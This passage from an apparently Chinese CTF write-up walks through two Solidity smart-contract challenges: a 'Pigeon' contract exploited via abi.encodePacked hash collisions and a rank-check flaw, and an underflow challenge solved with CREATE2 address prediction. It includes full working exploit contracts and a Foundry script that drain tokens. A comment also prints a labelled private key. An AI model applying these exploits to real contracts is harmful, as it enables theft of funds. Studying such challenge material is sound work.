class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;./lib/ERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Pigeon &#123;</span><br><span class="line">    address private owner;</span><br><span class="line">    uint256 private ownerBalance;</span><br><span class="line">    uint256 private juniorPromotion; //初级所需要的积分 // 8000000000000000000 (8ether)</span><br><span class="line">    uint256 private associatePromotion; //中级所需要的积分 //12000000000000000000 (12ether)</span><br><span class="line"></span><br><span class="line">    mapping(bytes32 =&gt; address) private seniorPigeon; //高级鸽子的地址</span><br><span class="line">    mapping(bytes32 =&gt; address) private associatePigeon; // 中级鸽子的地址</span><br><span class="line">    mapping(bytes32 =&gt; address) private juniorPigeon; // 初级鸽子的地址</span><br><span class="line">    mapping(address =&gt; bool) private isPigeon; //鸽子是否注册了</span><br><span class="line">    mapping(string =&gt; mapping(string =&gt; bool)) private codeToName; //判断是否被注册</span><br><span class="line">    mapping(bytes32 =&gt; uint256) private taskPoints; //每个鸽子的任务积分</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; mapping(address =&gt; uint256)) private dataCollection; //存储 某个地址 收集 另一个地址 的数据点数。</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; bool) private hasBeenCollected; //存储某个地址的数据是否已被收集（防止重复收集）。</span><br><span class="line"></span><br><span class="line">    mapping(bytes32 =&gt; uint256) private treasury; // 存储每个鸽子的资金</span><br><span class="line"></span><br><span class="line">    IERC20 public pigeonToken;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        if (owner != msg.sender) revert();</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier oneOfUs() &#123;</span><br><span class="line">        if (!isPigeon[msg.sender]) revert();</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    constructor(address _pigeonToken) &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        juniorPromotion = 8e18;</span><br><span class="line">        associatePromotion = 12e18;</span><br><span class="line">        pigeonToken = IERC20(_pigeonToken);</span><br><span class="line">    &#125;</span><br><span class="line">    //成为鸽子</span><br><span class="line"></span><br><span class="line">    function becomeAPigeon(string memory code, string memory name) public returns (bytes32 codeName) &#123;</span><br><span class="line">        codeName = keccak256(abi.encodePacked(code, name));</span><br><span class="line"></span><br><span class="line">        if (codeToName[code][name]) revert(&quot;code name chongfu&quot;);</span><br><span class="line">        if (isPigeon[msg.sender]) revert(&quot;yijingchengweigezi&quot;);</span><br><span class="line"></span><br><span class="line">        juniorPigeon[codeName] = msg.sender;</span><br><span class="line">        isPigeon[msg.sender] = true;</span><br><span class="line">        codeToName[code][name] = true;</span><br><span class="line"></span><br><span class="line">        return codeName;</span><br><span class="line">    &#125;</span><br><span class="line">    // 记录鸽子完成任务的积分</span><br><span class="line"></span><br><span class="line">    function task(bytes32 codeName, address person, uint256 data) public oneOfUs &#123;</span><br><span class="line">        if (person == address(0)) revert(&quot;0 address&quot;);</span><br><span class="line">        if (isPigeon[person]) revert(&quot;is Pigeon&quot;); //如果是鸽子回滚</span><br><span class="line">        if (pigeonToken.balanceOf(person) != data) revert(&quot;is not right&quot;);</span><br><span class="line"></span><br><span class="line">        uint256 points = data;</span><br><span class="line"></span><br><span class="line">        hasBeenCollected[person] = true;</span><br><span class="line">        dataCollection[msg.sender][person] = points;</span><br><span class="line">        taskPoints[codeName] += points;</span><br><span class="line">    &#125;</span><br><span class="line">    //带着token飞走</span><br><span class="line"></span><br><span class="line">    function flyAway(bytes32 codeName, uint256 rank) public oneOfUs &#123;</span><br><span class="line">        uint256 bag = treasury[codeName];</span><br><span class="line">        treasury[codeName] = 0;</span><br><span class="line">        if (rank == 0) &#123;</span><br><span class="line">            if (taskPoints[codeName] &gt; juniorPromotion) revert(); //可以等级绕过</span><br><span class="line"></span><br><span class="line">            require(pigeonToken.transfer(juniorPigeon[codeName], bag), &quot;Transfer failed.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        if (rank == 1) &#123;</span><br><span class="line">            if (taskPoints[codeName] &gt; associatePromotion) revert();</span><br><span class="line"></span><br><span class="line">            require(pigeonToken.transfer(associatePigeon[codeName], bag), &quot;Transfer failed.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        if (rank == 2) &#123;</span><br><span class="line">            require(pigeonToken.transfer(seniorPigeon[codeName], bag), &quot;Transfer failed.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //提升等级函数</span><br><span class="line"></span><br><span class="line">    function promotion(bytes32 codeName, uint256 desiredRank, string memory newCode, string memory newName)</span><br><span class="line">        public</span><br><span class="line">        oneOfUs</span><br><span class="line">    &#123;</span><br><span class="line">        if (desiredRank == 1) &#123;</span><br><span class="line">            if (msg.sender != juniorPigeon[codeName]) revert();</span><br><span class="line">            if (taskPoints[codeName] &lt; juniorPromotion) revert(&quot;xiaoyu 8&quot;);</span><br><span class="line">            ownerBalance += treasury[codeName];</span><br><span class="line"></span><br><span class="line">            bytes32 newCodeName = keccak256(abi.encodePacked(newCode, newName));</span><br><span class="line"></span><br><span class="line">            if (codeToName[newCode][newName]) revert(&quot;chong fu&quot;);</span><br><span class="line">            associatePigeon[newCodeName] = msg.sender;</span><br><span class="line">            codeToName[newCode][newName] = true;</span><br><span class="line">            taskPoints[codeName] = 0;</span><br><span class="line"></span><br><span class="line">            delete juniorPigeon[codeName];</span><br><span class="line"></span><br><span class="line">            require(pigeonToken.transfer(owner, treasury[codeName]), &quot;Transfer failed.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (desiredRank == 2) &#123;</span><br><span class="line">            if (msg.sender != associatePigeon[codeName]) revert();</span><br><span class="line">            if (taskPoints[codeName] &lt; associatePromotion) revert();</span><br><span class="line">            ownerBalance += treasury[codeName];</span><br><span class="line"></span><br><span class="line">            bytes32 newCodeName = keccak256(abi.encodePacked(newCode, newName));</span><br><span class="line"></span><br><span class="line">            if (codeToName[newCode][newName]) revert(&quot;chong fu&quot;);</span><br><span class="line">            seniorPigeon[newCodeName] = msg.sender;</span><br><span class="line">            codeToName[newCode][newName] = true;</span><br><span class="line">            taskPoints[codeName] = 0;</span><br><span class="line">            delete seniorPigeon[codeName]; //应当删除中级</span><br><span class="line">            require(pigeonToken.transfer(owner, treasury[codeName]), &quot;Transfer failed.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    // 分配鸽子到指定的地址</span><br><span class="line"></span><br><span class="line">    function assignPigeon(string memory code, string memory name, address pigeon, uint256 rank, uint256 value)</span><br><span class="line">        external</span><br><span class="line">        onlyOwner</span><br><span class="line">    &#123;</span><br><span class="line">        bytes32 codeName = keccak256(abi.encodePacked(code, name));</span><br><span class="line"></span><br><span class="line">        if (rank == 0) &#123;</span><br><span class="line">            juniorPigeon[codeName] = pigeon;</span><br><span class="line">            pigeonToken.transferFrom(msg.sender, address(this), value);</span><br><span class="line">            treasury[codeName] = value;</span><br><span class="line">            juniorPigeon[codeName] = pigeon;</span><br><span class="line">            isPigeon[pigeon] = true;</span><br><span class="line">            codeToName[code][name] = true;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (rank == 1) &#123;</span><br><span class="line">            associatePigeon[codeName] = pigeon;</span><br><span class="line">            pigeonToken.transferFrom(msg.sender, address(this), value);</span><br><span class="line">            treasury[codeName] = value;</span><br><span class="line">            associatePigeon[codeName] = pigeon;</span><br><span class="line">            isPigeon[pigeon] = true;</span><br><span class="line">            codeToName[code][name] = true;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (rank == 2) &#123;</span><br><span class="line">            seniorPigeon[codeName] = pigeon;</span><br><span class="line">            pigeonToken.transferFrom(msg.sender, address(this), value);</span><br><span class="line">            treasury[codeName] = value;</span><br><span class="line">            seniorPigeon[codeName] = pigeon;</span><br><span class="line">            isPigeon[pigeon] = true;</span><br><span class="line">            codeToName[code][name] = true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    // 提取鸽子钱财</span><br><span class="line"></span><br><span class="line">    function exit() public onlyOwner &#123;</span><br><span class="line">        require(pigeonToken.transfer(owner, ownerBalance), &quot;Transfer failed.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &#123;Pigeon&#125; from &quot;./Pigeon.sol&quot;;</span><br><span class="line">import &#123;PigeonToken&#125; from &quot;./PigeonToken.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Setup &#123; //本地地址：0x5FbDB2315678afecb367f032d93F642f64180aa3</span><br><span class="line">    Pigeon public pigeon; //0x40a2c4445c7f5f4e4c7c7d2827db05b3238c0d49</span><br><span class="line">    PigeonToken public token; //0x36e29f14570ccc94a0f4cf0f325c644e9af5cc8b</span><br><span class="line">    bool isAirdrop;</span><br><span class="line">    bool solved;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        token = new PigeonToken(&quot;PigeonToken&quot;, &quot;PNK&quot;, address(this));</span><br><span class="line">        pigeon = new Pigeon(address(token));</span><br><span class="line"></span><br><span class="line">        token.approve(address(pigeon), 30e18);</span><br><span class="line">        // Junior Pigeons</span><br><span class="line">        pigeon.assignPigeon(&quot;Numbuh&quot;, &quot;6&quot;, address(0x006), 0, 0); //0x364f98c531ea17218ff9dda330f09255297b6406571ed44903382c6f328b6824</span><br><span class="line">        pigeon.assignPigeon(&quot;Numbuh&quot;, &quot;5&quot;, address(0x005), 0, 5e18);</span><br><span class="line">        // 0x57736ab320740b0130b3b7eb68b9bfe7e656bf5bdde03903ac9930ab830e48df</span><br><span class="line"></span><br><span class="line">        // Associate Pigeons</span><br><span class="line">        pigeon.assignPigeon(&quot;Numbuh&quot;, &quot;4&quot;, address(0x004), 1, 0); // 0xa5c9d4ef5b24cb6ff388731d9d4c137ba330d7fe79015e4959372f32fdf77791</span><br><span class="line">        pigeon.assignPigeon(&quot;Numbuh&quot;, &quot;3&quot;, address(0x003), 1, 10e18); //0xa110a037bba8f4590b8521d98f7885200af3356e7b4d9e4514843ffa4268f8c0</span><br><span class="line"></span><br><span class="line">        // Senior Pigeons</span><br><span class="line">        pigeon.assignPigeon(&quot;Numbuh&quot;, &quot;2&quot;, address(0x002), 2, 0); // 0xf55eb91c4569e79ebadf94351a230d4f73cf0ecd7628a1903208a1acb1ed2545</span><br><span class="line">        pigeon.assignPigeon(&quot;Numbuh&quot;, &quot;1&quot;, address(0x001), 2, 15e18); //0x0e34ac47b10f9f17721304f64c880a18cc4912d616027d5e83beb11eaf74f925</span><br><span class="line">    &#125;</span><br><span class="line">    //六个鸽子，</span><br><span class="line"></span><br><span class="line">    function airdrop() external &#123;</span><br><span class="line">        require(!isAirdrop, &quot;You have already airdropped!&quot;);</span><br><span class="line">        isAirdrop = true;</span><br><span class="line">        token.transfer(msg.sender, 4e18);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function check() external &#123;</span><br><span class="line">        bool hasEnoughTokens = token.balanceOf(msg.sender) &gt;= 34e18; //足够代币</span><br><span class="line">        // 检查 Pigeon 合约中的代币余额是否为 0</span><br><span class="line">        bool pigeonBalanceIsZero = token.balanceOf(address(pigeon)) == 0;</span><br><span class="line"></span><br><span class="line">        solved = hasEnoughTokens &amp;&amp; pigeonBalanceIsZero;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isSolved() external view returns (bool) &#123;</span><br><span class="line">        return solved;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;./lib/ERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract PigeonToken is ERC20 &#123;</span><br><span class="line">    constructor(string memory name, string memory symbol, address owner) ERC20(name, symbol) &#123;</span><br><span class="line">        _mint(owner, 34e18);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>其中这个题目主要考察的是abi.ecodePacked的漏洞点</p>
<p>其中keccak（abi.encodePacked(“wang”,”jianfegng)） 和 keccak(abi.encodePacked(“wangjian”,”feng)) 是一样的 我们可以利用这个漏洞点来对鸽子所携带的资金进行一个窃取，</p>
<p>其中我的主要思路是： 在一开始伪造一个和15 ether 相同鸽子的bytes32 然后因为鸽子飞走的函数存在一个等级的漏洞所以我们可以直接窃取这15 ether 其中task函数可以被我们无限刷取功勋，因为 hasBeenCollected[person] &#x3D; true;这个mapping只是变成正了但是没有回滚所以我们可以无限刷取功勋，然后再利用晋升函数的newcode 进而成为其他带有代币的鸽子的codename然后我们就可以按照第一个挨个窃取</p>
<h2 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: SEE LICENSE IN LICENSE</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &#123;Pigeon&#125; from &quot;./Pigeon.sol&quot;;</span><br><span class="line">import &#123;PigeonToken&#125; from &quot;./PigeonToken.sol&quot;;</span><br><span class="line">import &#123;Setup&#125; from &quot;./Setup.sol&quot;;</span><br><span class="line">import &#123;console2&#125; from &quot;forge-std/console2.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    Pigeon public pigeon; //0x40a2c4445c7f5f4e4c7c7d2827db05b3238c0d49</span><br><span class="line">    PigeonToken public token; //0x36e29f14570ccc94a0f4cf0f325c644e9af5cc8b</span><br><span class="line">    Setup public setup;</span><br><span class="line">    address eoa = 0x58b49f84D196bcB30C45AB8d2Db343598bC0fB1f;</span><br><span class="line">    constructor() &#123;</span><br><span class="line">        setup = Setup(0x162832130dC92A86839BA249113C89d607271EA8);</span><br><span class="line">        pigeon = Pigeon(setup.pigeon());</span><br><span class="line">        token = PigeonToken(setup.token());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    bytes32 NUm1 = 0x0e34ac47b10f9f17721304f64c880a18cc4912d616027d5e83beb11eaf74f925;</span><br><span class="line">    bytes32 NUm2 = 0xf55eb91c4569e79ebadf94351a230d4f73cf0ecd7628a1903208a1acb1ed2545;</span><br><span class="line">    bytes32 NUm3 = 0xa110a037bba8f4590b8521d98f7885200af3356e7b4d9e4514843ffa4268f8c0;</span><br><span class="line">    bytes32 NUm4 = 0xa5c9d4ef5b24cb6ff388731d9d4c137ba330d7fe79015e4959372f32fdf77791;</span><br><span class="line">    bytes32 NUm5 = 0x57736ab320740b0130b3b7eb68b9bfe7e656bf5bdde03903ac9930ab830e48df;</span><br><span class="line">    bytes32 NUm6 = 0x364f98c531ea17218ff9dda330f09255297b6406571ed44903382c6f328b6824;</span><br><span class="line">    function attack() external &#123;</span><br><span class="line">        setup.airdrop();</span><br><span class="line">        bytes32 wang1 = pigeon.becomeAPigeon(&quot;Num&quot;, &quot;buh1&quot;);</span><br><span class="line">        console2.logBytes32(wang1);</span><br><span class="line">        token.approve(address(this), type(uint256).max);</span><br><span class="line">        token.transferFrom(address(this), eoa, 4 ether);</span><br><span class="line">        pigeon.flyAway(0x0e34ac47b10f9f17721304f64c880a18cc4912d616027d5e83beb11eaf74f925, 0); //窃取15ether</span><br><span class="line">        pigeon.task(wang1, eoa, 4 ether);</span><br><span class="line">        pigeon.task(wang1, eoa, 4 ether);</span><br><span class="line">        pigeon.promotion(wang1, 1, &quot;Num&quot;, &quot;buh5&quot;);</span><br><span class="line">        bytes32 wang2 = keccak256(abi.encodePacked(&quot;Num&quot;, &quot;buh5&quot;));</span><br><span class="line"></span><br><span class="line">        pigeon.flyAway(wang2, 1);</span><br><span class="line"></span><br><span class="line">        pigeon.task(wang2, eoa, 4 ether);</span><br><span class="line">        pigeon.task(wang2, eoa, 4 ether);</span><br><span class="line">        pigeon.task(wang2, eoa, 4 ether);</span><br><span class="line">        pigeon.task(wang2, eoa, 4 ether);</span><br><span class="line">        pigeon.promotion(wang2, 2, &quot;Num&quot;, &quot;buh3&quot;);</span><br><span class="line">        bytes32 wang3 = keccak256(abi.encodePacked(&quot;Num&quot;, &quot;buh3&quot;));</span><br><span class="line">        pigeon.flyAway(wang3, 2);</span><br><span class="line">        uint256 token3 = token.balanceOf(address(this));</span><br><span class="line">        console2.log(token3);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack2() external &#123;</span><br><span class="line">        token.transferFrom(0x58b49f84D196bcB30C45AB8d2Db343598bC0fB1f, address(this), 4 ether);</span><br><span class="line">        setup.check();</span><br><span class="line">        setup.isSolved();</span><br><span class="line">        require(setup.isSolved() == true, &quot;no&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">//Address:     0x507509D8c4Cc0F08c04e628a61cb55B00A9577c5</span><br><span class="line">//rivate key: 0xcb77e579685fd67228e463f95b2517643b7f3efb4334fa3e0c3361c2b964a3b9</span><br><span class="line">//v4.local.Wlb2FKrNklQ1r7iA-Bx6octBLFHV3Ck0Ltwsq5xhqCL0m-2-trZKwP_mWyV3a_CfbbcWXO1cTWHVxh3TP8ypny20txV_7wYnPkvKbDKMSen3aTBKZgfh9MV1t-IcembR7VsxFFFPOpOjxAn-p4UMUzTUoXtndTolS2Kognu-0CHoCA.U2V0dXA</span><br><span class="line">// SPDX-License-Identifier: SEE LICENSE IN LICENSE</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &#123;Attack&#125; from &quot;../src/Attack.sol&quot;;</span><br><span class="line">import &#123;Script&#125; from &quot;forge-std/Script.sol&quot;;</span><br><span class="line">import &#123;PigeonToken&#125; from &quot;../src/PigeonToken.sol&quot;;</span><br><span class="line">import &quot;../src/lib/ERC20.sol&quot;;</span><br><span class="line">import &#123;Setup&#125; from &quot;../src/Setup.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract AttackScript is Script &#123;</span><br><span class="line">    ERC20 public token;</span><br><span class="line">    Setup public setup;</span><br><span class="line"></span><br><span class="line">    function run() public &#123;</span><br><span class="line">        vm.startBroadcast();</span><br><span class="line">        setup = Setup(0x162832130dC92A86839BA249113C89d607271EA8);</span><br><span class="line">        token = ERC20(setup.token());</span><br><span class="line">        Attack attack = new Attack();</span><br><span class="line"></span><br><span class="line">        attack.attack();</span><br><span class="line">        token.approve(address(attack), type(uint256).max);</span><br><span class="line">        attack.attack2();</span><br><span class="line">        vm.stopBroadcast();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中这里需要注意的是一个授权问题，我们需要在脚本的时候直接对我们攻击合约进行一个授权，这样才能让让我们之前存放Eoa的代币取回来，不能在攻击合约里面授权 不能！！！！。</p>
<p>其中这个题目的原先所有的回滚都是没有注释的。所以如果下次的题目还是没有注释我们可以直接先弄到本地来打。</p>
<h1 id="8地址预测"><a href="#8地址预测" class="headerlink" title="8地址预测"></a>8地址预测</h1><p>源码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.7.0;</span><br><span class="line"></span><br><span class="line">//0x5FbDB2315678afecb367f032d93F642f64180aa3</span><br><span class="line">contract Challenge &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public balance; //查看余额</span><br><span class="line">    bool public solve;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function Get() public &#123;</span><br><span class="line">        balance[msg.sender] = 50;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function Transfer(address to, uint256 amount) public &#123;</span><br><span class="line">        require(amount &gt; 0, &quot;Man!&quot;);</span><br><span class="line">        require(balance[msg.sender] &gt; 0, &quot;What can I say&quot;);</span><br><span class="line">        require(balance[msg.sender] - amount &gt; 0, &quot;Mamba out!&quot;);</span><br><span class="line">        require(</span><br><span class="line">            uint160(msg.sender) % (16 * 16) == 239,</span><br><span class="line">            &quot;Sometimes I ask myself, who am i?&quot;</span><br><span class="line">        );</span><br><span class="line">        balance[msg.sender] -= amount;</span><br><span class="line">        balance[to] += amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function check() public &#123;</span><br><span class="line">        require(balance[msg.sender] == 114514);</span><br><span class="line">        solve = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isSolved() public view returns (bool) &#123;</span><br><span class="line">        return solve;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>看到这个题目，先看合约版本，先看合约版本，先看合约版本，然后再做</p>
<p>看合约版本不是0.8后，就要关注是否有溢出漏洞，然后在transfer函数呢里的第二个检测确实是溢出漏洞，（一开始我没有去关注这个合约版本，然后就是准备用薅羊毛漏洞去做，虽然是可以做，但是不如这个溢出漏洞简单）</p>
<p>其中第三个要求就是想让我们得到一个需要满足这个要求的地址，所以这里就是需要一个create2的预测地址的方法</p>
<h2 id="create2-预测地址方法"><a href="#create2-预测地址方法" class="headerlink" title="create2 预测地址方法"></a>create2 预测地址方法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: SEE LICENSE IN LICENSE</span><br><span class="line">pragma solidity ^0.7.0;</span><br><span class="line"></span><br><span class="line">import &#123;Attack&#125; from &quot;../src/Hack.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Deployer &#123;</span><br><span class="line">    function computeSalt(address target) public view returns (bytes32) &#123;</span><br><span class="line">        for (uint256 i = 0; i &lt; 1000000; i++) &#123;</span><br><span class="line">            bytes32 salt = bytes32(i);</span><br><span class="line">            address predictedAddress = predictAddress(salt, target);</span><br><span class="line">            if (uint256(uint160(predictedAddress)) % (16 * 16) == 239) &#123;</span><br><span class="line">                return salt;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        revert(&quot;No suitable salt found within the limit&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function predictAddress(</span><br><span class="line">        bytes32 salt,</span><br><span class="line">        address target</span><br><span class="line">    ) public view returns (address) &#123;</span><br><span class="line">        bytes memory bytecode = abi.encodePacked(</span><br><span class="line">            type(Attack).creationCode,</span><br><span class="line">            abi.encode(target)</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        bytes32 hash = keccak256(</span><br><span class="line">            abi.encodePacked(</span><br><span class="line">                bytes1(0xff),</span><br><span class="line">                address(this), // 部署者地址</span><br><span class="line">                salt,</span><br><span class="line">                keccak256(bytecode)</span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        return address(uint160(uint256(hash)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deployer(bytes32 salt, address target) public returns (address) &#123;</span><br><span class="line">        Attack attack = new Attack&#123;salt: salt&#125;(target); // 使用 CREATE2 部署</span><br><span class="line">        return address(attack);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>其中上面可上面这个合约就是可以完全预测一个合约的地址</p>
<h2 id="攻击合约-2"><a href="#攻击合约-2" class="headerlink" title="攻击合约"></a>攻击合约</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.7.0;</span><br><span class="line"></span><br><span class="line">import &#123;Challenge&#125; from &quot;./1.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span 